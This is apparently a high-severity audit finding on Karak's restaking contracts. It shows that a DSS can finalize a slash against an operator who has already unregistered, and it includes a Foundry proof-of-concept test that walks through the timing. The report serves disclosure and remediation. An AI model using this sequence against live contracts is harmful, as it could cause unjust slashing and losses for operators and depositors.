## [H] Violation of Invariant Allowing DSSs to Slash Unregistered Operators

Operators select DSSs to allocate their funds to, and for each DSS, they can choose a list of vaults to stake. The selected vaults are fully staked to the chosen DSS.

To unstake, the operator must adhere to a `MIN_STAKE_UPDATE_DELAY` of 9 days, which prevents front-running a slashing event. An operator can fully unregister from a DSS once all the vaults are unstaked. The DSS has the ability to slash any malicious behaviour that occurred before the withdrawal initiation for up to 7 days.

The problem is, the current implementation breaks one of the main invariants (confirmed by sponsors).

* [**Only DSSs an operator is registered with can slash said operator**](https://code4rena.com/audits/2024-07-karak-restaking#top:\~:text=Only%20DSSs%20an%20operator%20is%20registered%20with%20can%20slash%20said%20operator)

Consider the following scenario:

* Operator calls the [requestUpdateVaultStakeInDSS](repos/2024-07-karak/src/Core.sol#L130) function to unstake Vault 1 from DSS, initiating the 9-day `MIN_STAKE_UPDATE_DELAY`.
* After 8 days, the DSS calls the [requestSlashing](repos/2024-07-karak/src/Core.sol#L220) function on Operatorâ€™s Vault 1, starting the 2-day `SLASHING_VETO_WINDOW`.
* After 1 day, the operator calls the [finalizeUnstaking](repos/2024-07-karak/src/Core.sol#L248C14-L248C30) function to finalize unstaking Vault 1 from DSS and the [unregisterOperatorFromDSS](repos/2024-07-karak/src/Core.sol#L113C14-L113C39) function to unregister from DSS.
* After another day, the DSS (or anyone) calls the [finalizeSlashing](repos/2024-07-karak/src/Core.sol#L248C14-L248C30) function to finalize the slash on the operator, who is no longer registered with the DSS.

### Proof Of Concept

```solidity
    function test_slash_unregistered_operator() public {
        // register operator to dss, deploy vaults, stake vaults to dss
        stake_vaults_to_dss();
        // check if operator is registered to dss
        assertEq(true, core.isOperatorRegisteredToDSS(operator, dss));
        // unstake vaults from dss
        address[] memory operatorVaults = core.fetchVaultsStakedInDSS(operator, dss);
        Operator.StakeUpdateRequest memory stakeUpdate =
            Operator.StakeUpdateRequest({vault: operatorVaults[0], dss: dss, toStake: false});
        Operator.StakeUpdateRequest memory stakeUpdate2 =
            Operator.StakeUpdateRequest({vault: operatorVaults[1], dss: dss, toStake: false});
        vm.startPrank(operator);
        Operator.QueuedStakeUpdate memory queuedStakeUpdate = core.requestUpdateVaultStakeInDSS(stakeUpdate);
        Operator.QueuedStakeUpdate memory queuedStakeUpdate2 = core.requestUpdateVaultStakeInDSS(stakeUpdate2);
        vm.stopPrank();
        skip(8 days);
        // dss request slashing
        uint96[] memory slashPercentagesWad = new uint96[](2);
        slashPercentagesWad[0] = uint96(10e18);
        slashPercentagesWad[1] = uint96(10e18);
        SlasherLib.SlashRequest memory slashingReq = SlasherLib.SlashRequest({
            operator: operator,
            slashPercentagesWad: slashPercentagesWad,
            vaults: operatorVaults
        });
        vm.startPrank(address(dss));
        SlasherLib.QueuedSlashing memory queuedSlashing = core.requestSlashing(slashingReq);
        vm.stopPrank();
        skip(1 days);
        vm.startPrank(operator);
        // finalize unstake and unregister operator from dss
        core.finalizeUpdateVaultStakeInDSS(queuedStakeUpdate);
        core.finalizeUpdateVaultStakeInDSS(queuedStakeUpdate2);
        core.unregisterOperatorFromDSS(dss, "");
        vm.stopPrank();
        skip(1 days);
        // check if operator is unregistered from dss
        assertEq(false, core.isOperatorRegisteredToDSS(operator, dss));
        // finalize slashing on unregistered operator
        core.finalizeSlashing(queuedSlashing);
    }
```

### Impact

The current implementation allows a DSS to finalize a slash on an operator even after the operator has unregistered from the DSS. This breaks the intended invariant that only DSSs an operator is registered with can slash that operator.

Additionally, new users depositing into the DSS may be unaware of the pending slash because the operator is no longer registered with the DSS, leading to a potential loss on deposits.



 
